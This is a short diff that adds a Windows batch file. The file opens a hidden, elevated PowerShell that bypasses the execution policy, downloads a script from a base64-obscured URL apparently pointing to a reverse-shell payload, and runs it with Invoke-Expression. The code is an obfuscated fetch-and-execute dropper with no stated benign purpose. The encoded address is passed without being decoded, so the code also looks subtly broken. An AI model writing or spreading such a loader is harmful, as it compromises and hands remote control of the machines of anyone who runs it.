@@ -1,0 +1,2 @@
+@echo off
+powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "& {Start-Process powershell.exe -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""& { Invoke-WebRequest -Uri ""aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbmVudC5jb20vQVRUQUNLcm9ueW0vcmV2c2gwMS9ibG9iL21hc3Rlci9hdHRhY2tyb255bV9yc3B5bGQucHMx"" -UseBasicParsing | Invoke-Expression }""' -Verb RunAs}"
